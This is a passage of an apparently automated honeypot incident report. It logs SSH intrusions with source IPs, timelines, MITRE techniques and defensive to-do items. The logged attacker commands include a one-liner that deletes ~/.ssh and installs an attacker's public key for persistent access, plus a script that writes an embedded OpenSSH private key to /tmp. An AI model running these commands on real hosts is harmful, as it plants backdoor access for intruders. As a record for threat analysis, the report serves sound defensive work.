| `2026-09-11 03:45:19` | `cowrie.command.input` |
| `2026-09-11 03:45:19` | `cowrie.command.input` |
| `2026-09-11 03:45:19` | `cowrie.command.input` |
| `2026-09-11 03:45:19` | `cowrie.command.input` |
| `2026-09-11 03:45:19` | `cowrie.command.input` |
| `2026-09-11 03:45:19` | `cowrie.command.success` |
| `2026-09-11 03:45:19` | `cowrie.command.input` |
| `2026-09-11 03:45:19` | `cowrie.command.input` |
| `2026-09-11 03:45:19` | `cowrie.command.input` |
| `2026-09-11 03:45:19` | `cowrie.command.input` |
| `2026-09-11 03:45:19` | `cowrie.log.closed` |
| `2026-09-11 03:45:20` | `cowrie.session.params` |
| `2026-09-11 03:45:20` | `cowrie.command.input` |
| `2026-09-11 03:45:21` | `cowrie.log.closed` |
| `2026-09-11 03:45:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9aee675f6528

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-11 03:47 |
| **Last Seen** | 2026-09-11 03:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 03:47:40` | `cowrie.session.connect` |
| `2026-09-11 03:47:40` | `cowrie.client.version` |
| `2026-09-11 03:47:41` | `cowrie.client.kex` |
| `2026-09-11 03:47:41` | `cowrie.login.success` |
| `2026-09-11 03:47:42` | `cowrie.session.params` |
| `2026-09-11 03:47:42` | `cowrie.command.input` |
| `2026-09-11 03:47:42` | `cowrie.command.input` |
| `2026-09-11 03:47:42` | `cowrie.command.input` |
| `2026-09-11 03:47:42` | `cowrie.command.input` |
| `2026-09-11 03:47:42` | `cowrie.command.input` |
| `2026-09-11 03:47:42` | `cowrie.command.success` |
| `2026-09-11 03:47:42` | `cowrie.command.input` |
| `2026-09-11 03:47:42` | `cowrie.command.input` |
| `2026-09-11 03:47:42` | `cowrie.command.input` |
| `2026-09-11 03:47:42` | `cowrie.command.input` |
| `2026-09-11 03:47:43` | `cowrie.log.closed` |
| `2026-09-11 03:47:43` | `cowrie.session.params` |
| `2026-09-11 03:47:43` | `cowrie.command.input` |
| `2026-09-11 03:47:44` | `cowrie.log.closed` |
| `2026-09-11 03:47:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df545c6c04d4

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-11 03:50 |
| **Last Seen** | 2026-09-11 03:50 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 03:50:01` | `cowrie.session.connect` |
| `2026-09-11 03:50:01` | `cowrie.client.version` |
| `2026-09-11 03:50:01` | `cowrie.client.kex` |
| `2026-09-11 03:50:02` | `cowrie.login.success` |
| `2026-09-11 03:50:04` | `cowrie.session.params` |
| `2026-09-11 03:50:04` | `cowrie.command.input` |
| `2026-09-11 03:50:04` | `cowrie.command.input` |
| `2026-09-11 03:50:04` | `cowrie.command.input` |
| `2026-09-11 03:50:04` | `cowrie.command.input` |
| `2026-09-11 03:50:04` | `cowrie.command.input` |
| `2026-09-11 03:50:04` | `cowrie.command.success` |
| `2026-09-11 03:50:04` | `cowrie.command.input` |
| `2026-09-11 03:50:04` | `cowrie.command.input` |
| `2026-09-11 03:50:04` | `cowrie.command.input` |
| `2026-09-11 03:50:04` | `cowrie.command.input` |
| `2026-09-11 03:50:04` | `cowrie.log.closed` |
| `2026-09-11 03:50:05` | `cowrie.session.params` |
| `2026-09-11 03:50:05` | `cowrie.command.input` |
| `2026-09-11 03:50:05` | `cowrie.log.closed` |
| `2026-09-11 03:50:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0663a5edcdda

| Field | Detail |
|---|---|
| **Source IP** | `113.171.81[.]144` |
| **First Seen** | 2026-09-11 03:51 |
| **Last Seen** | 2026-09-11 03:51 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 03:51:47` | `cowrie.session.connect` |
| `2026-09-11 03:51:47` | `cowrie.client.version` |
| `2026-09-11 03:51:47` | `cowrie.client.kex` |
| `2026-09-11 03:51:48` | `cowrie.login.success` |
| `2026-09-11 03:51:49` | `cowrie.session.params` |
| `2026-09-11 03:51:49` | `cowrie.command.input` |
| `2026-09-11 03:51:49` | `cowrie.command.failed` |
| `2026-09-11 03:51:50` | `cowrie.log.closed` |
| `2026-09-11 03:51:51` | `cowrie.session.params` |
| `2026-09-11 03:51:51` | `cowrie.command.input` |
| `2026-09-11 03:51:51` | `cowrie.session.file_download` |
| `2026-09-11 03:51:51` | `cowrie.log.closed` |
| `2026-09-11 03:51:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.171.81[.]144` to AbuseIPDB if not already reported
- [ ] Block `113.171.81[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b554c575053

| Field | Detail |
|---|---|
| **Source IP** | `113.171.81[.]144` |
| **First Seen** | 2026-09-11 03:51 |
| **Last Seen** | 2026-09-11 03:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 03:51:51` | `cowrie.session.connect` |
| `2026-09-11 03:51:51` | `cowrie.client.version` |
| `2026-09-11 03:51:52` | `cowrie.client.kex` |
| `2026-09-11 03:51:54` | `cowrie.login.success` |
| `2026-09-11 03:51:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.171.81[.]144` to AbuseIPDB if not already reported
- [ ] Block `113.171.81[.]144` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be6c922f3c50

| Field | Detail |
|---|---|
| **Source IP** | `113.171.81[.]144` |
| **First Seen** | 2026-09-11 03:51 |
| **Last Seen** | 2026-09-11 03:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 03:51:54` | `cowrie.session.connect` |
| `2026-09-11 03:51:54` | `cowrie.client.version` |
| `2026-09-11 03:51:54` | `cowrie.client.kex` |
| `2026-09-11 03:51:56` | `cowrie.login.success` |
| `2026-09-11 03:51:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.171.81[.]144` to AbuseIPDB if not already reported
- [ ] Block `113.171.81[.]144` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a97507a496f

| Field | Detail |
|---|---|
| **Source IP** | `129.121.128[.]70` |
| **First Seen** | 2026-09-11 03:56 |
| **Last Seen** | 2026-09-11 03:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 03:56:25` | `cowrie.session.connect` |
| `2026-09-11 03:56:25` | `cowrie.client.version` |
| `2026-09-11 03:56:25` | `cowrie.client.kex` |
| `2026-09-11 03:56:26` | `cowrie.login.success` |
| `2026-09-11 03:56:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.128[.]70` to AbuseIPDB if not already reported
- [ ] Block `129.121.128[.]70` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-356b95c8cac8

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-09-11 03:56 |
| **Last Seen** | 2026-09-11 03:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca, ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 03:56:26` | `cowrie.session.connect` |
| `2026-09-11 03:56:26` | `cowrie.client.version` |
| `2026-09-11 03:56:26` | `cowrie.client.kex` |
| `2026-09-11 03:56:27` | `cowrie.login.success` |
| `2026-09-11 03:56:28` | `cowrie.session.params` |
| `2026-09-11 03:56:28` | `cowrie.command.input` |
| `2026-09-11 03:56:28` | `cowrie.session.file_download` |
| `2026-09-11 03:56:28` | `cowrie.session.file_download` |
| `2026-09-11 03:56:28` | `cowrie.log.closed` |
| `2026-09-11 03:56:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5faadeb499bc

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-11 04:01 |
| **Last Seen** | 2026-09-11 04:01 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 04:01:23` | `cowrie.session.connect` |
| `2026-09-11 04:01:23` | `cowrie.client.version` |
| `2026-09-11 04:01:23` | `cowrie.client.kex` |
| `2026-09-11 04:01:25` | `cowrie.login.success` |
| `2026-09-11 04:01:28` | `cowrie.direct-tcpip.request` |
| `2026-09-11 04:01:29` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-11 04:01:29` | `cowrie.direct-tcpip.data` |
| `2026-09-11 04:01:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8df65bbb1032

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-11 04:20 |
| **Last Seen** | 2026-09-11 04:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 04:20:58` | `cowrie.session.connect` |
| `2026-09-11 04:20:58` | `cowrie.client.version` |
| `2026-09-11 04:20:58` | `cowrie.client.kex` |
| `2026-09-11 04:20:58` | `cowrie.login.success` |
| `2026-09-11 04:20:59` | `cowrie.direct-tcpip.request` |
| `2026-09-11 04:20:59` | `cowrie.direct-tcpip.data` |
| `2026-09-11 04:20:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b33a7d513b8a

| Field | Detail |
|---|---|
| **Source IP** | `122.177.244[.]200` |
| **First Seen** | 2026-09-11 04:38 |
| **Last Seen** | 2026-09-11 04:38 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 04:38:44` | `cowrie.session.connect` |
| `2026-09-11 04:38:44` | `cowrie.client.version` |
| `2026-09-11 04:38:45` | `cowrie.client.kex` |
| `2026-09-11 04:38:46` | `cowrie.login.success` |
| `2026-09-11 04:38:47` | `cowrie.session.params` |
| `2026-09-11 04:38:47` | `cowrie.command.input` |
| `2026-09-11 04:38:47` | `cowrie.command.failed` |
| `2026-09-11 04:38:47` | `cowrie.log.closed` |
| `2026-09-11 04:38:48` | `cowrie.session.params` |
| `2026-09-11 04:38:48` | `cowrie.command.input` |
| `2026-09-11 04:38:49` | `cowrie.session.file_download` |
| `2026-09-11 04:38:49` | `cowrie.log.closed` |
| `2026-09-11 04:38:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.177.244[.]200` to AbuseIPDB if not already reported
- [ ] Block `122.177.244[.]200` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3334f6a47484

| Field | Detail |
|---|---|
| **Source IP** | `122.177.244[.]200` |
| **First Seen** | 2026-09-11 04:38 |
| **Last Seen** | 2026-09-11 04:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 04:38:49` | `cowrie.session.connect` |
| `2026-09-11 04:38:49` | `cowrie.client.version` |
| `2026-09-11 04:38:49` | `cowrie.client.kex` |
| `2026-09-11 04:38:51` | `cowrie.login.success` |
| `2026-09-11 04:38:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.177.244[.]200` to AbuseIPDB if not already reported
- [ ] Block `122.177.244[.]200` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5abdfcd8433

| Field | Detail |
|---|---|
| **Source IP** | `122.177.244[.]200` |
| **First Seen** | 2026-09-11 04:38 |
| **Last Seen** | 2026-09-11 04:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 04:38:51` | `cowrie.session.connect` |
| `2026-09-11 04:38:51` | `cowrie.client.version` |
| `2026-09-11 04:38:51` | `cowrie.client.kex` |
| `2026-09-11 04:38:53` | `cowrie.login.success` |
| `2026-09-11 04:38:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.177.244[.]200` to AbuseIPDB if not already reported
- [ ] Block `122.177.244[.]200` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a465b35a519b

| Field | Detail |
|---|---|
| **Source IP** | `84.161.241[.]179` |
| **First Seen** | 2026-09-11 04:40 |
| **Last Seen** | 2026-09-11 04:40 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 04:40:09` | `cowrie.session.connect` |
| `2026-09-11 04:40:10` | `cowrie.client.version` |
| `2026-09-11 04:40:10` | `cowrie.client.kex` |
| `2026-09-11 04:40:18` | `cowrie.login.success` |
| `2026-09-11 04:40:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `84.161.241[.]179` to AbuseIPDB if not already reported
- [ ] Block `84.161.241[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25f6ddf1f868

| Field | Detail |
|---|---|
| **Source IP** | `34.62.148[.]109` |
| **First Seen** | 2026-09-11 04:40 |
| **Last Seen** | 2026-09-11 04:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 04:40:25` | `cowrie.session.connect` |
| `2026-09-11 04:40:25` | `cowrie.client.version` |
| `2026-09-11 04:40:25` | `cowrie.client.kex` |
| `2026-09-11 04:40:27` | `cowrie.login.success` |
| `2026-09-11 04:40:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.62.148[.]109` to AbuseIPDB if not already reported
- [ ] Block `34.62.148[.]109` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffe09f165834

| Field | Detail |
|---|---|
| **Source IP** | `185.7.242[.]118` |
| **First Seen** | 2026-09-11 04:42 |
| **Last Seen** | 2026-09-11 04:42 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 04:42:20` | `cowrie.session.connect` |
| `2026-09-11 04:42:20` | `cowrie.client.version` |
| `2026-09-11 04:42:20` | `cowrie.client.kex` |
| `2026-09-11 04:42:21` | `cowrie.login.success` |
| `2026-09-11 04:42:23` | `cowrie.session.params` |
| `2026-09-11 04:42:23` | `cowrie.command.input` |
| `2026-09-11 04:42:23` | `cowrie.command.failed` |
| `2026-09-11 04:42:23` | `cowrie.log.closed` |
| `2026-09-11 04:42:24` | `cowrie.session.params` |
| `2026-09-11 04:42:24` | `cowrie.command.input` |
| `2026-09-11 04:42:25` | `cowrie.session.file_download` |
| `2026-09-11 04:42:25` | `cowrie.log.closed` |
| `2026-09-11 04:42:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.7.242[.]118` to AbuseIPDB if not already reported
- [ ] Block `185.7.242[.]118` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ed41dbb46ce

| Field | Detail |
|---|---|
| **Source IP** | `185.7.242[.]118` |
| **First Seen** | 2026-09-11 04:42 |
| **Last Seen** | 2026-09-11 04:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 04:42:25` | `cowrie.session.connect` |
| `2026-09-11 04:42:25` | `cowrie.client.version` |
| `2026-09-11 04:42:26` | `cowrie.client.kex` |
| `2026-09-11 04:42:27` | `cowrie.login.success` |
| `2026-09-11 04:42:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.7.242[.]118` to AbuseIPDB if not already reported
- [ ] Block `185.7.242[.]118` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd9417cf5ee7

| Field | Detail |
|---|---|
| **Source IP** | `185.7.242[.]118` |
| **First Seen** | 2026-09-11 04:42 |
| **Last Seen** | 2026-09-11 04:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 04:42:28` | `cowrie.session.connect` |
| `2026-09-11 04:42:28` | `cowrie.client.version` |
| `2026-09-11 04:42:28` | `cowrie.client.kex` |
| `2026-09-11 04:42:29` | `cowrie.login.success` |
| `2026-09-11 04:42:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.7.242[.]118` to AbuseIPDB if not already reported
- [ ] Block `185.7.242[.]118` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6c028e2948b

| Field | Detail |
|---|---|
| **Source IP** | `47.80.68[.]74` |
| **First Seen** | 2026-09-11 04:45 |
| **Last Seen** | 2026-09-11 04:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 04:45:15` | `cowrie.session.connect` |
| `2026-09-11 04:45:15` | `cowrie.client.version` |
| `2026-09-11 04:45:16` | `cowrie.client.kex` |
| `2026-09-11 04:45:16` | `cowrie.login.success` |
| `2026-09-11 04:45:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.80.68[.]74` to AbuseIPDB if not already reported
- [ ] Block `47.80.68[.]74` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7f07d10e04c

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-09-11 04:45 |
| **Last Seen** | 2026-09-11 04:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca, ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
